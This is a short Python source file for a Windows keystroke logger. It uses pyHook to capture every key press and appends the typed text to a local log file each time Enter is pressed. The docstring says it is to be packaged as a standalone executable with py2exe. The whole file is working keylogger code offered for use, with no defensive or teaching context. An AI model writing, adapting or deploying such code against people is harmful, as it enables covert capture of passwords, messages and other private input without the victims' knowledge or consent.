
""" Author: Daniel Puckowski
    Date (last edit): 03/21/2014
    Purpose: Keystroke logging on a Windows machine.
	     This script is to be converted into a native Windows executable using py2exe.
    Version: 0.0.0.5
"""

import sys
import pyHook
import pythoncom

DEFAULT_OUTPUT_FILE = '.\\log.txt'

keystrokeData  = '' 
outputFilename = ''

def OnKeyPress(keyEvent):
	global keystrokeData
	keystrokeData += keyEvent.Key

	if keyEvent.Ascii == 13:
		keystrokeData += '\n'
		
		logFile = open(outputFilename, 'a')
		logFile.write(keystrokeData)
		logFile.close()
		
		keystrokeData = ''

	return True
	
def main(argv):
	global outputFilename
	arguments = sys.argv[0:]
	
	try:
		outputFilename = arguments[1]
	except Exception:
		outputFilename = DEFAULT_OUTPUT_FILE
		
	hookManager = pyHook.HookManager()
	hookManager.KeyDown = OnKeyPress
	hookManager.HookKeyboard()
	
	pythoncom.PumpMessages() 
	
if __name__ == "__main__":
	main(sys.argv[0:])
